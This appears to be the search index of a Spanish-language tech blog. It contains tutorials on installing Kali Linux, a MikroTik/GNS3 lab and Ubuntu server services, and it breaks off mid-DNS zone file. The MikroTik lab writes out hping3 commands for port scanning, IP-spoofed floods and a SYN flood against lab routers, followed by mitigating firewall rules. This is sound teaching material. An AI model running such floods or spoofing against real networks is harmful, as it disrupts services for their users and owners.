{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Whoami","text":"<p>Soy Juan Carlos Charfuelan, ingeniero de software y apasionado por la tecnolog\u00eda, especialmente en las \u00e1reas de ciberseguridad, administracion de servidiores y redes. Como creador de contenido, he iniciado un proyecto en YouTube y Twitch con el objetivo de educar y contribuir al crecimiento de la comunidad tecnol\u00f3gica. A trav\u00e9s de estas plataformas, compartir\u00e9 conocimientos y experiencias relacionados con diversos aspectos de la tecnolog\u00eda, brindando contenido valioso y actualizado. Mi enfoque se centra en la difusi\u00f3n de informaci\u00f3n de calidad que pueda ser \u00fatil tanto para principiantes como para profesionales del sector. Estoy emocionado por emprender este camino y poder aportar mi granito de arena al mundo tecnol\u00f3gico. Espero que mi contenido sea de su inter\u00e9s y los invito a acompa\u00f1arme en esta traves\u00eda de aprendizaje continuo.</p>"},{"location":"#cybersecurity","title":"Cybersecurity","text":""},{"location":"articles/kali-linux/","title":"COMO INSTALAR KALI LINUX EN ENTORNO VIRTUAL PARA HACKING","text":""},{"location":"articles/kali-linux/#kali-linux","title":"Kali Linux","text":"<p>Kali Linux es una distribuci\u00f3n de Linux basada en Debian, dise\u00f1ada para la seguridad inform\u00e1tica tanto ofensiva como defensiva y la auditoria de redes. Es mantenida y financiada por Offensive Security. Kali Linux incluye una gran cantidad de herramientas preinstaladas que se utilizan para diversas tareas de seguridad de la informaci\u00f3n, tales como:</p> <ul> <li>Pruebas de penetraci\u00f3n (pentesting)</li> <li>An\u00e1lisis de vulnerabilidades</li> <li>Forense digital</li> <li>Ingenier\u00eda inversa</li> <li>Pruebas de seguridad inal\u00e1mbrica</li> <li>Explotaci\u00f3n de redes y sistemas</li> </ul>"},{"location":"articles/kali-linux/#plataformas-para-instalar-kali-linux","title":"Plataformas para instalar Kali Linux","text":"<p>Existen diversas plataformas para instalar Kali Linux. Se dispone de una imagen base en formato ISO para instalaciones en m\u00e1quinas f\u00edsicas o en m\u00e1quinas virtuales desde cero. Adem\u00e1s, se recomienda descargar una m\u00e1quina virtual preconfigurada de Kali Linux para ejecutarla en un sistema de virtualizaci\u00f3n. Tambi\u00e9n se ofrecen versiones para arquitecturas ARM, adecuadas para ciertos dispositivos. Kali Linux se puede instalar en dispositivos m\u00f3viles, en sistemas en la nube, en contenedores, y ejecutarse desde una memoria USB port\u00e1til, lo cual es \u00fatil para ciertos trabajos. Adem\u00e1s, es posible ejecutarlo en el Subsistema de Windows para Linux (WSL), permitiendo utilizar una terminal de Kali Linux en sistemas Windows.</p> <p></p> <p>Algunas de las herramientas populares incluidas en Kali Linux son Nmap, Wireshark, Metasploit, Aircrack-ng, John the Ripper, Burp Suite, y muchas otras. Kali Linux es altamente valorado en la comunidad de seguridad inform\u00e1tica debido a su accesibilidad y la amplia gama de herramientas que ofrece. Sin embargo, debe ser utilizado con responsabilidad y de manera \u00e9tica, ya que su uso indebido puede ser ilegal y perjudicial.</p>"},{"location":"articles/kali-linux/#descarga-de-kali-linux","title":"Descarga de Kali Linux","text":"<p>Accedemos a la parte de descargas, para obtener la opci\u00f3n de descargas.</p> <p></p> <p>Al acceder a la secci\u00f3n de descargas, seleccionamos la opci\u00f3n de m\u00e1quinas virtuales para explorar las diferentes alternativas disponibles para los sistemas de virtualizaci\u00f3n.</p> <p></p> <p>Elegimos la opci\u00f3n donde vayamos a configurar nuestra maquina virtual, en este caso vamos a utilizar VMware.</p> <p></p> <p>Elegimos la ruta donde vamos a descargar nuestra archivo comprimido de la maquina virtual.</p> <p></p>"},{"location":"articles/kali-linux/#descomprimir-el-archivo","title":"Descomprimir el archivo","text":"<p>Luego de haber elegido la ruta de descarga procedemos a descomprimir el archivo 7zip, y proceder a acceder a los archivos que van hacer cargados a VMware.</p> <p></p> <p>Con el siguiente comando descomprimimos un archivo en Linux con extensi\u00f3n 7z.</p> <pre><code>7z x kali-linux-2024.2-vmware-amd64.7z\n</code></pre> <p>Comienza a descomprimir el archivo y esperamos a que finalice el proceso.</p> <p></p> <p>Proceso al finalizar descomprimir el archivo.</p> <p></p>"},{"location":"articles/kali-linux/#carga-la-maquina-virtual-a-vmware","title":"Carga la maquina virtual a VMware","text":"<p>Para cargar la imagen de Kali Linux a VMware seleccionamos en abrir un archivo, seleccionamos la ubicaci\u00f3n y elegimos en abrir la imagen.</p> <p></p> <p>Al finalizar el proceso de carga, es recomendable configurar los requisitos de la m\u00e1quina virtual para asegurar un mejor rendimiento durante el trabajo, teniendo en cuenta tambi\u00e9n las especificaciones de la m\u00e1quina host.</p> <p></p>"},{"location":"articles/kali-linux/#encender-la-maquina-kali-linux","title":"Encender la maquina Kali Linux","text":"<p>Al terminar de configurar y encender la maquina ingresamos y el usuario y contrase\u00f1ara por defecto son <code>kali</code>.</p> <p></p>"},{"location":"articles/nat-attack-hping/","title":"CONFIGURACI\u00d3N NAT Y ATAQUE CON HPING MIKROTIK","text":""},{"location":"articles/nat-attack-hping/#configuracion-de-la-topologia-de-red","title":"Configuraci\u00f3n de la topolog\u00eda de red","text":"<p>Se importaron tres routers Mikrotik con la versi\u00f3n 7.11.2, utilizando GNS3 para establecer la conexi\u00f3n y simular su funcionamiento. Conforme a la topolog\u00eda definida, se configuraron los tres routers, cada uno con su respectiva subred de conexi\u00f3n, manejando la interfaz de WAN para salir a internet y una interfaz de LAN para el manejo local de los dispositivo a utilizar en este laboratorio.</p> <p></p>"},{"location":"articles/nat-attack-hping/#identidad-de-cada-router","title":"Identidad de cada router","text":"<p>Se configur\u00f3 la identidad para cada router y poder manejarlos de una manera m\u00e1s f\u00e1cil.</p> <p>Router 1 </p> <p>Router 2 </p> <p>Router 3 </p>"},{"location":"articles/nat-attack-hping/#configuracion-de-red-nat","title":"Configuraci\u00f3n de red NAT","text":"<p>Utilizando la configuraci\u00f3n de red NAT para conectarnos con Winbox de la aplicaci\u00f3n local donde se est\u00e1 administrando la conexi\u00f3n con el router R1. </p> <p>Configuraci\u00f3n de la Red LAN de la red para proporcionar NAT a la conexi\u00f3n de la red y poder acceder a las diferentes configuraciones de proveer internet a los dos routers y m\u00e1quina de windows 10 para proveer su configuraci\u00f3n.</p> <p></p> <p>Configuramos la dhcp para proveer una IP a la red LAN que se cre\u00f3 para los dos routers.</p> <p>Se crea una direcci\u00f3n IP para la interfaz de red ether2-LAN para proveer de una direcci\u00f3n de red v\u00e1lida.</p> <p></p> <p>Para configurar el NAT y tener acceso a internet a traves de los dos routers conectados a la interfaz LAN del R1, creamo la siguiente teconfiguracion de NAT con masquerade. </p> <p>Regla de firewall para internet con sus diferentes DNS de salida a internet. </p>"},{"location":"articles/nat-attack-hping/#configuracion-de-dhcp-en-el-router","title":"Configuraci\u00f3n de DHCP en el router","text":"<p>Prueba de conectividad dentro del rango configurado Al configurar el DHCP al servidor y las reglas de NAT, observamos que ya no genera una direcci\u00f3n de red dentro del rango configurado y con las reglas de firewall pertinentes de mikrotik. </p> <p>Traza ICMP desde el router principal hacia la m\u00e1quina host configurada. </p> <p>Y me guarda en la tabla de ARP las diferentes configuraciones de la m\u00e1quina conectada. </p> <p>Y de acuerdo a esas configuraciones tenemos una asignaci\u00f3n por DHCP a los routers R2 y R3, con su respectiva IP. </p> <p></p>"},{"location":"articles/nat-attack-hping/#investigando-trafico-en-tiempo-real-con-torch","title":"Investigando tr\u00e1fico en tiempo real con TORCH","text":"<p>Se va a realizar el an\u00e1lisis de tr\u00e1fico dentro de la red LAN para el tr\u00e1fico entre los diferentes routers conectados a la LAN. </p> <p>Tr\u00e1fico desde R2 y R3 Se realiza un tr\u00e1fico hacia internet desde el R3, y analizamos el tr\u00e1fico que se genera con TORCH.</p> <pre><code>[admin@R2] &gt; ping 1.1.1.1\n[admin@R3] &gt; ping 8.8.8.8\n</code></pre> <p></p> <p>Resultado se logra ver el tr\u00e1fico que se genera con estos paquetes enviados desde R2 y R3 hacia internet. </p> <p>Y se puede observar el diferente tr\u00e1fico que se genera y mirando los anchos de banda que se van generando por cada petici\u00f3n.</p> <p></p>"},{"location":"articles/nat-attack-hping/#trafico-capturado-con-wireshark","title":"Tr\u00e1fico capturado con Wireshark","text":"<p>Para este m\u00e9todo se realiza la captura en la interfaz de red de LAN con el siguiente comando para capturar una traza ICMP que se env\u00eda desde R3.</p> <pre><code>[admin@R3] &gt; ping 8.8.8.8\n</code></pre> <p></p> <p>En la topolog\u00eda se coloc\u00f3 a escuchar en el punto de uni\u00f3n entre el switch y el R1, donde est\u00e1 nuestro punto de control con mikrotik como puerta de enlace hacia la WAN.</p> <p></p> <p>Paquete capturado con wireshark </p>"},{"location":"articles/nat-attack-hping/#ataque-a-la-red-utilizando-hping3","title":"Ataque a la red utilizando hping3","text":"<p>La funci\u00f3n de hping3 viene preinstalada en las herramientas de Kali Linux, con lo cual vamos hacer uso de ella para esta actividad. </p>"},{"location":"articles/nat-attack-hping/#simulacion-de-trafico-y-pruebas-de-conectividad","title":"Simulaci\u00f3n de tr\u00e1fico y pruebas de conectividad","text":"<p>Con el siguiente comando podemos ver nuestra conectividad y poder conocer las maquinas que estan conectadas en nuestra red</p> <pre><code>sudo arp-scan -I eth0 --localnet\n</code></pre> <p>Se puede observar con el escaneo las IP de los routers R1, R2, R3, ya tenemos las IPs y ahora procedemos a realizar algunas pruebas de conectividad. </p> <ul> <li>Utilizando ping hacia los routers e internet</li> </ul> <p>Enviamos una traza ICMP a los diferentes router e internet para poder observar si tenemos conectividad.</p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Utilizando traceroute  hacia los routers e internet</li> </ul> <p>Los paquetes enviados hacia internet realizan la b\u00fasqueda del camino hasta llegar al dominio de google, con lo que se puede observar que hay conectividad.</p> <p></p> <p>El traceroute realizada a los routers se puede observar que es directo ya que est\u00e1 conectado directamente a la red LAN donde se encuentra conectados y la ruta es m\u00e1s directa y r\u00e1pida de encontrar.</p> <p></p> <ul> <li>Utilizando hping3 para escaner algunos dominios</li> </ul> <p>Este comando realizar\u00e1 un traceroute hacia <code>www.google.com</code> utilizando paquetes ICMP en lugar de los paquetes UDP que utiliza por defecto el comando traceroute. El comando mostrar\u00e1 la lista de routers por los que pasan los paquetes en su camino hacia <code>www.google.com</code>, y dado que se usa -V, se dar\u00e1 informaci\u00f3n detallada sobre cada salto.</p> <pre><code>sudo hping3 --traceroute -V -1 www.google.com\n</code></pre> <p></p> <p>En el siguiente comando se realiza un escaneo SYN de puertos en el rango 0 al 50 sobre la direcci\u00f3n R1=172.16.0.1. Est\u00e1 dise\u00f1ado para verificar qu\u00e9 puertos est\u00e1n abiertos en el host de destino. Al usar el flag SYN (-S), hping3 simula el primer paso del proceso de conexi\u00f3n TCP (el handshake), pero no completa la conexi\u00f3n. Si un puerto est\u00e1 abierto, el host responder\u00e1 con un paquete SYN-ACK; si est\u00e1 cerrado, el host responder\u00e1 con un paquete RST.</p> <pre><code>sudo hping3 -S --scan 0-50 172.16.0.1 -c 1\n</code></pre> <p></p>"},{"location":"articles/nat-attack-hping/#ataques-simulados-con-hping3","title":"Ataques simulados con hping3","text":"<p>Vamos a realizar un ataque de inundaci\u00f3n de peticiones hacia los routers para ver su funcionamiento y c\u00f3mo se comportan.</p>"},{"location":"articles/nat-attack-hping/#realizando-ataque-con-hping3-al-r2","title":"Realizando ataque con hping3 al R2","text":"<p>IP Spoof Al lanzar el comando realizando un IP Spoof a la direcci\u00f3n de R2, con un trafico con DNS 1.1.1.1 enviando diferentes paquetes, y el trafico se ve reflejado en la interfaz de wireshark como el tr\u00e1fico se env\u00eda con varios paquetes de ASK.</p> <pre><code>sudo hping3 172.16.0.253 -t 128 -a 1.1.1.1\n</code></pre> <p>Captura de tr\u00e1fico con wireshark</p> <p></p>"},{"location":"articles/nat-attack-hping/#realizando-ataque-con-hping3-al-r3","title":"Realizando ataque con hping3 al R3","text":"<p>IP Spoof Realizamos el mismo procedimiento hacia R3 y observamos el tr\u00e1fico.</p> <pre><code>sudo hping3 172.16.0.254 -t 128 -a 1.1.1.1\n</code></pre> <p></p> <p></p> <p>Cuando se realiza el ataque enviando m\u00e1s con hping3 con 10000 paques se observa que la carga del sistema del router R1 comienza a elevar el consumo de recursos.</p> <pre><code>sudo hping3 -I eth0 -c 10000 -S --faster 172.16.0.1\n</code></pre> <p></p> <p>En la captura de wireshark se observa las peticiones que se hacen al router.</p> <p></p> <p>Y cada vez que se realicen m\u00e1s peticiones el sistema de mikrotik, se observa un consumo de los procesos de la CPU del sistema, la capturas de consumo se realizan dentro de winbox para el router R1 de mikrotik.</p> <p></p>"},{"location":"articles/nat-attack-hping/#mitigacion","title":"Mitigaci\u00f3n","text":"<p>Reglas de firewall En las siguientes reglas de firewall est\u00e1n dise\u00f1adas para proteger contra ataques de SYN flood, un tipo de ataque de Denegaci\u00f3n de Servicio (DoS) en el que el atacante env\u00eda un gran n\u00famero de solicitudes TCP SYN (inicializaci\u00f3n de conexi\u00f3n) con el fin de agotar los recursos del servidor.</p> <p>Este comando comando redirige las nuevas conexiones TCP SYN a la cadena SYN-Protect.</p> <pre><code>/ip firewall filter add chain=input protocol=tcp\\ tcp-flags=syn connection-state=new\\ action=jump jump-target=SYN-Protect\\ comment=\"Flood protect\" disabled=no\n</code></pre> <p>Este comando permite un n\u00famero limitado de conexiones nuevas por segundo (400), para mitigar ataques SYN flood.</p> <pre><code>/ip firewall filter add chain=SYN-Protect protocol=tcp\\ tcp-flags=syn limit=400,5\\ connection-state=new action=accept\\ comment=\"\" disabled=no\n</code></pre> <p>Este comando descarta cualquier conexi\u00f3n SYN nueva que exceda el l\u00edmite, bloqueando posibles ataques que intenten sobrecargar el sistema.</p> <pre><code>/ip firewall filter add chain=SYN-Protect protocol=tcp\\ tcp-flags=syn connection-state=new \\ action=drop comment=\"Si se supera el l\u00edmite de la segunda regla, ser\u00e1 bloqueado.\" disabled=no\n</code></pre> <p>Se ejecutan en los tres router para mitigar este ataque. </p> <p>Reglas de firewall configuradas Estas reglas ya configuradas ayudan a mitigar el tr\u00e1fico dentro de la red, disminuyendo los ataques que se realicen.</p> <p></p>"},{"location":"articles/nat-attack-hping/#recomendaciones","title":"Recomendaciones","text":"<p>Filtrado de paquetes en los routers: Utiliza Access Control Lists (ACLs) en los routers para bloquear tr\u00e1fico no autorizado, espec\u00edficamente los paquetes que no son necesarios para las funciones de la red. Esto puede evitar escaneos de puertos y ataques de rastreo.</p> <p>Habilita un firewall de inspecci\u00f3n profunda (Deep Packet Inspection, DPI) en el router para monitorear el contenido de los paquetes y detectar comportamientos an\u00f3malos o sospechosos, como intentos de escaneo de puertos.</p> <p>Prevenir ataques de escaneo de puertos como TCP SYN Cookies, donde se configure en el router o firewall la opci\u00f3n de habilitar la funci\u00f3n de SYN cookies para prevenir ataques de tipo SYN flood, en los que un atacante intenta llenar la tabla de conexiones a trav\u00e9s del env\u00edo masivo de solicitudes SYN.</p> <p>Implementar VLANs (Virtual LANs) para segmentar el tr\u00e1fico dentro de la red. Esto aislar\u00e1 diferentes tipos de dispositivos y reducir\u00e1 la superficie de ataque. Los ataques como el escaneo de puertos ser\u00e1n limitados a la VLAN en la que se encuentre el atacante.</p>"},{"location":"articles/servidor-ubuntu/","title":"IMPLEMENTACI\u00d3N Y CONFIGURACI\u00d3N DE SERVICIOS SSH, DHCP, HTTP, DNS Y FTP EN UN SERVIDOR","text":"<p>En este laboratorio se implementara una red, donde esta conectado un computador con Windows 10 y un servidor Ubuntu server 22.04.4 LTS, y se implementara los servicios de SSH, DHCP, HTTP, DNS, FTP.</p>"},{"location":"articles/servidor-ubuntu/#pasos-previos","title":"Pasos previos","text":"<p>Los pasos previos que se deben de realizar, se van a trabajar en el software de virtualizaci\u00f3n de VirtualBox, que es un sistema de virtualizaci\u00f3n gratuito y que nos facilita muchas cosas a la hora de empezar a administrar maquinas virtuales.</p>"},{"location":"articles/servidor-ubuntu/#instalacion-de-ubuntu-server","title":"Instalaci\u00f3n de Ubuntu Server","text":"<p>Para la implementaci\u00f3n de este laboratorio debes de tener instalado una maquina de Ubuntu server LTC, con su respectiva versi\u00f3n, en este caso vamos a trabajar con una versi\u00f3n de Ubuntu 24.04.4 LTC, puedes ver la instalaci\u00f3n en el siguiente link de instalaci\u00f3n de Ubuntu Server.</p>"},{"location":"articles/servidor-ubuntu/#instalacion-de-windows","title":"Instalaci\u00f3n de Windows","text":"<p>Para este laboratorio no es necesario tener un versi\u00f3n de Windows requerida, lo puedes hacer con la que desees, ya que solo har\u00e1 de cliente para probar las respectivas funcionalidades configuradas en el Servidor.</p>"},{"location":"articles/servidor-ubuntu/#configuracion-de-la-topologia-de-red","title":"Configuraci\u00f3n de la topolog\u00eda de red","text":"<p>Para realizar este laboratorio se tendr\u00e1 una red aislada para conectar los diferentes equipos, simulando una red de conexi\u00f3n entre los equipos, esto nos ayuda a tener un laboratorio mas controlado y lograr hacer lo que se propone en la siguiente grafica.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#configuracion-de-virtualbox","title":"Configuraci\u00f3n de VirtualBox","text":""},{"location":"articles/servidor-ubuntu/#1-crear-una-nueva-red-aislada","title":"1. Crear una nueva red aislada","text":"<p>Seguimos los siguientes pasos para crear la nueva red, elegimos <code>tools</code> y despu\u00e9s en una <code>network manager</code> donde vamos a poder administrar las redes con virtual box.</p> <p></p> <p>Y elegimos una red <code>Host-only Networks</code>.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#2-para-crear-una-nueva-red","title":"2. Para crear una nueva red","text":"<p>Para crear la nueva red, le damos en el bot\u00f3n <code>create</code> y aceptamos los permisos necesario para proceder a crear la red.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#3-configuracion-de-direccion-de-red","title":"3. Configuraci\u00f3n de direcci\u00f3n de red","text":"<p>Procedemos a configurar la direcci\u00f3n de red que va a tener esta nueva red, en este caso no nos deja elegir una red, a partir de 1, con lo cual configuramos la direcci\u00f3n de red <code>10.10.10.1</code>.</p> <p></p> <p>Y dejamos la configuraci\u00f3n de DHCP que nos facilita VirtualBox como deshabilitada, ya que posteriormente la vamos a configurar con el servidor de Ubuntu.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#configuracion-de-dos-interfaces-de-red-para-ubuntu-server-y-windows-10","title":"Configuraci\u00f3n de dos interfaces de red para Ubuntu Server y Windows 10","text":""},{"location":"articles/servidor-ubuntu/#administracion-de-redes-en-ubuntu-server","title":"Administraci\u00f3n de Redes en Ubuntu Server","text":"<p>Vamos a configurar dos interfaces de res al servidor de Ubuntu server para mayor facilidad de trabajo, ya que va a tener una interfaz de red para conectarse a internet y otra para conectarse a la red interna creada. Vamos a ingresar a la parte de red de la maquina y configuramos dos adaptadores.</p> <p></p> <p>Y debemos de configurar el primer adaptador como se muestra en la imagen, donde este tendr\u00e1 acceso desde la maquina principal y con acceso a la red.</p> <p></p> <p></p>"},{"location":"articles/servidor-ubuntu/#administracion-de-red-windows-10","title":"Administraci\u00f3n de Red Windows 10","text":"<p>Para configurar la red en Windows 10, solo debe habilitar una red, la cual ser\u00e1 la conexi\u00f3n con el servidor Ubuntu, que proveer\u00e1 los servicios a configurar.</p> <p>Y el cual esta conectado a la red interna que se configuro anteriormente.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#conexion-con-mobaxterm-a-servidor","title":"Conexi\u00f3n con MobaXterm a Servidor","text":"<p>Esta configuraci\u00f3n se realiza para facilitar el trabajo, ya que utilizaremos una conexi\u00f3n <code>ssh</code> para ejecutar comandos desde la m\u00e1quina principal, conect\u00e1ndonos a trav\u00e9s de un servidor de conexi\u00f3n remota, como puede ser PUTTY, MobaXterm, Solar-PuTTY, OPENSSH, CMD, entre muchas otras herramientas que nos facilitan el trabajo.</p> <p>Esta configuraci\u00f3n la realizaremos desde MobaXterm, que es mi herramienta de trabajo, cuando ya ingresemos a la maquina de Ubuntu Server, vamos el siguiente comando para conocer su direcci\u00f3n de IP para conexi\u00f3n remota y las interfaces de red disponibles para este servidor.</p> <pre><code># Comando completo\nmain@main-server:~$ ip addres\n\n# Comando con su abreviatura\nmain@main-server:~$ ip a\n</code></pre> <p></p> <p>Observamos que sus interfaces de red configuradas anteriormente con el gestor de red de VirtualBox son la <code>enp0s3</code> y <code>enp0s8</code>, la cual la interfaz de red 2 y la IP <code>192.168.1.153</code>, nos ofrece la direcci\u00f3n de red para conexi\u00f3n remota con <code>ssh</code>. Este protocolo de conexi\u00f3n viene al momento de instalar Ubuntu Server, se se sigui\u00f3 los pasos respectivos previos, ya tienes <code>ssh</code> en el servidor, y si no lo tienes revisa el paso posterior donde se va a instalar SSH y debes primero realizar esa configuraci\u00f3n de instalaci\u00f3n, para realizar este paso.</p>"},{"location":"articles/servidor-ubuntu/#conexion-con-mobaxterm","title":"Conexi\u00f3n con MobaXterm","text":"<p>Realizamos una nueva sesi\u00f3n de conexi\u00f3n.</p> <p></p> <p>Y accedemos por medio de SSH y configuramos la IP y el nombre de usuario configurado anteriormente, para este caso mi direcci\u00f3n IP es <code>192.168.1.153</code> y mi usuario <code>main</code>.</p> <p></p> <p>Una vez ingresado los par\u00e1metros te pedir\u00e1 la contrase\u00f1a y lograras acceder al servidor.</p> <p></p> <p>Una vez ingresado ya puedes realizar las configuraciones mas f\u00e1cilmente.</p>"},{"location":"articles/servidor-ubuntu/#crear-un-servidor-con-ubuntu-server","title":"Crear un servidor con Ubuntu Server","text":""},{"location":"articles/servidor-ubuntu/#0-configuracion-de-ip-estatica-para-interfaz-de-red-servidor","title":"0. Configuraci\u00f3n de IP est\u00e1tica para interfaz de red Servidor","text":"<p>Vamos a configurar la IP de servidor Ubuntu de la interfaz de red aislada para realizar conexi\u00f3n con la maquina de Windows 10.</p> <p>Para ingresar a la configuraci\u00f3n debemos de editar el siguiente archivo con el siguiente comando, en este caso vamos a utilizar el editor de c\u00f3digo <code>vim</code>, puedes utilizar otro editor c\u00f3digo de l\u00ednea de comandos como <code>nano</code>.</p> <pre><code>sudo vim /etc/netplan/00-installer-config.yaml\n</code></pre> <p>Y configuramos la el archivo <code>yaml</code> de la siguiente forma.</p> <pre><code>network:\n  ethernets:\n    enp0s3:\n      dhcp4: true\n    enp0s8:\n      addresses: [10.10.10.2/24]\n  version: 2\n</code></pre> <p>Lugo de configurar la IP est\u00e1tica guardamos los cambios con <code>wq</code>(este comando solo sirve para vim) y aplicamos los cambios con el siguiente comando.</p> <pre><code>sudo netplan apply\n</code></pre> <p>Y ya podemos observar que tenemos configurada la IP de esta nueva interfaz de red.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#1-configuracion-de-ssh","title":"1. Configuraci\u00f3n de SSH","text":"<p>Vamos a configurar el servidor SSH para poder tener desde otra maquina, con el protocolo para compartir y tener conexi\u00f3n con otro dispositivo de manera segura. Comprobamos si el servicio de SSH esta corriendo en el sistema, utilizando el siguiente comando.</p> <pre><code>systemctl status ssh\n</code></pre> <p></p> <p>Se puede comprobar que el servicio esta corriendo y que esta activado, si no esta instalado debes de ejecutar el siguiente comando y comprobar su estado.</p> <pre><code># Installar openssh\nsudo apt-get install openssh-server\n\n# Verificar su estado\nsystemctl status ssh\n</code></pre>"},{"location":"articles/servidor-ubuntu/#2-configuracion-de-dhcp","title":"2. Configuraci\u00f3n de DHCP","text":"<p>Luego de haber configurado la direcci\u00f3n IP est\u00e1tica para el servidor Ubuntu, vamos a proceder a instalar el servicio de DHCP, para que preste el servicio a otras maquinas la prestaci\u00f3n de una IP en el rango de IPs.</p> <p>Para instalar el servicio de DHCP <code>isc-dhcp-server</code>, ejecutamos el siguiente comando.</p> <pre><code>sudo apt install isc-dhcp-server -y\n</code></pre> <p>Luego de instalar el servicio de DHCP, entramos a configurar el archivo de configuraci\u00f3n <code>dhcpd.conf</code>, donde vamos se va a agregar las configuraciones de red adecuadas para la asignaci\u00f3n de la red en DHCP.</p> <pre><code>sudo vim /etc/dhcp/dhcpd.conf\n</code></pre> <pre><code># DHCP PARA LA RED\ngroup red-interna {\nsubnet 10.10.10.0 netmask 255.255.255.0 {\n range 10.10.10.10 10.10.10.30;\n default-lease-time 3600;\n max-lease-time 86400;\n option domain-name-servers 10.10.10.2;\n option domain-name \"redes.local\";\n option subnet-mask 255.255.255.0;\n option routers 10.10.10.1;\n option broadcast-address 10.10.10.255;\n}\n}\n</code></pre> <p>Y se agrega la configuraci\u00f3n al final del archivo.</p> <p></p> <p>Y verificamos si la configuraci\u00f3n esta correctamente configurada.</p> <pre><code>sudo dhcpd -t -cf /etc/dhcp/dhcpd.conf\n</code></pre> <p></p> <p>Procedemos a configurar  la interfaz de red del servidor DHCP.</p> <pre><code>sudo vim /etc/default/isc-dhcp-server\n</code></pre> <p>Y se modifica la siguiente l\u00ednea en el archivo dependiendo del nombre de la interfaz de red que tenga, para nuestro caso es la <code>enp0s3</code>, como se muestra a continuaci\u00f3n.</p> <p></p> <pre><code>NTERFACESv4=\"enp0s8\"\n</code></pre> <p></p> <p>Finalmente procedemos a reiniciar el servicio DHCP y revisamos el estados si est\u00e1 activo, ejecutamos las dos primeras l\u00edneas en la terminal por separado.</p> <pre><code>sudo systemctl restart isc-dhcp-server\nsudo systemctl status isc-dhcp-server\n</code></pre> <p></p>"},{"location":"articles/servidor-ubuntu/#verificamos-la-ip-en-el-sistema-cliente-de-windows-10","title":"Verificamos la IP en el sistema cliente de Windows 10","text":"<p>Podemos comprobar ingresando al s\u00edmbolo del sistema de Windows 10, y ingresar el siguiente comando para comprobar la configuraci\u00f3n de DHCP.</p> <pre><code>ipconfig\n</code></pre> <p>Como se puede observar, en las configuraciones de red, ya el servidor DHCP, nos dio la IP <code>10.10.10.20</code> y con puerta de enlace <code>10.10.10.1</code>, las que fueron configuradas en el servidor de Ubuntu.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#3-configuracion-de-ftp","title":"3. Configuraci\u00f3n de FTP","text":"<p>Para el servidor FTP, vamos instalar el siguiente servicio <code>vsftpd</code> en el servidor de Ubuntu Server.</p> <pre><code>sudo apt-get install vsftpd -y\n</code></pre> <p>Luego de instalar el servicio para <code>ftp</code>, se realiza la modificaci\u00f3n de un archivo del sistema, para poder realizar la conexi\u00f3n con el sistema.</p> <pre><code>sudo vim /etc/vsftpd.conf\n</code></pre> <p>La siguiente l\u00ednea comentada debe descomentarse para activar el traspaso de archivos.</p> <pre><code>write_enable=YES\n</code></pre> <p></p> <p>Procede a reiniciar el servicio de <code>ftp</code>, con la ejecuci\u00f3n de la siguientes l\u00edneas por separado.</p> <pre><code>sudo service vsftpd restart\nsudo service vsftpd status\n</code></pre> <p></p>"},{"location":"articles/servidor-ubuntu/#comprobar-el-servicio-ftp-desde-windows","title":"Comprobar el servicio ftp desde windows","text":"<p>Para probar si el servicio de ftp esta corriendo perfectamente lo vamos a hacer a trav\u00e9s de una herramienta llamada <code>WinSCP</code>.</p> <p>Configuramos los par\u00e1metros para realizar la conexi\u00f3n con la direcci\u00f3n IP del servidor y el usuario respectivo y la contrase\u00f1a.</p> <p></p> <p>Al finalizar ya tenemos la conexi\u00f3n respectiva, y podemos compartir archivos entre la maquina cliente y el servidor.</p> <p></p>"},{"location":"articles/servidor-ubuntu/#4-configuracion-de-dns","title":"4. Configuraci\u00f3n de DNS","text":"<p>Instalar DNS con BIND9</p> <pre><code>sudo apt install bind9 bind9-utils -y\n</code></pre> <p>Verificamos el estatus de <code>bind9</code> para ver si todo esta funcionando bien.</p> <pre><code>sudo systemctl status bind9\n</code></pre> <p></p> <p>Permitir de forma sencilla en el Firewall local, el acceso al puerto y protocolo que utiliza Bind9</p> <pre><code>sudo ufw allow bind9\n</code></pre> <p>Configuraci\u00f3n m\u00ednima de Bind9</p> <pre><code>sudo vim /etc/bind/named.conf.options\n</code></pre> <p>L\u00edneas a modificar, agregar o eliminar (el archivo debe contener lo siguiente),y si estan la lineas <code>dnssec-validation auto;</code> y <code>listen-on-v6 { any; };</code> se deben de comentar en el archivo.</p> <pre><code>listen-on { any; };\nallow-query { localhost; 10.10.10.0/24; };\nforwarders {\n        8.8.8.8;\n        8.8.4.4;\n};\n\n#dnssec-validation auto;\ndnssec-validation no;\n#listen-on-v6 { any; };\n</code></pre> <p>El archivo debe de quedar con las siguientes configuraciones.</p> <p></p> <p>Obligar el uso \u00fanico de IPv4, modificando el siguiente archivo, y modificando la siguiente l\u00ednea <code>OPTIONS=\"-u bind -4\"</code>.</p> <pre><code>sudo vim /etc/default/named\n</code></pre> <p></p> <p>Comprobar la configuraci\u00f3n de Bind9 y reiniciar el servicio si todo est\u00e1 bien, luego lanzar status para ver si no hay errores.</p> <pre><code>sudo named-checkconf\nsudo systemctl restart bind9\nsudo systemctl status bind9\n</code></pre> <p></p>"},{"location":"articles/servidor-ubuntu/#agregamos-las-zonas","title":"Agregamos las zonas","text":"<p>Modificamos el siguiente archivo, creando las respectivas Zonas, tanto directa como inversa.</p> <pre><code>sudo vim /etc/bind/named.conf.local\n</code></pre> <pre><code>zone \"networld.cu\" IN {\n        type master;\n        file \"/etc/bind/zonas/db.networld.cu\";\n};\n\nzone \"10.10.10.in-addr.arpa\" {\n        type master;\n        file \"/etc/bind/zonas/db.10.10.10\";\n};\n</code></pre> <p>Creando el directorio donde guardaremos los archivos de zonas y luego creamos las dos zonas, la directa y la inversa.</p> <pre><code>sudo mkdir /etc/bind/zonas\n</code></pre> <p>Y creamos el siguiente archivo con la siguiente modificaci\u00f3n</p> <pre><code>sudo vim /etc/bind/zonas/db.networld.cu\n</code></pre> <pre><code>$TTL    1D\n@       IN      SOA     ns1.networld.cu. admin.networld.cu. (\n        1               ; Serial\n        12h             ; Refresh\n        15m             ; Retry\n        3w              ; Expire\n        2h  )           ; Negative Cache TTL\n\n;       Registros NS\n\n        IN      NS      ns1.networld.cu.\nns1     IN      A       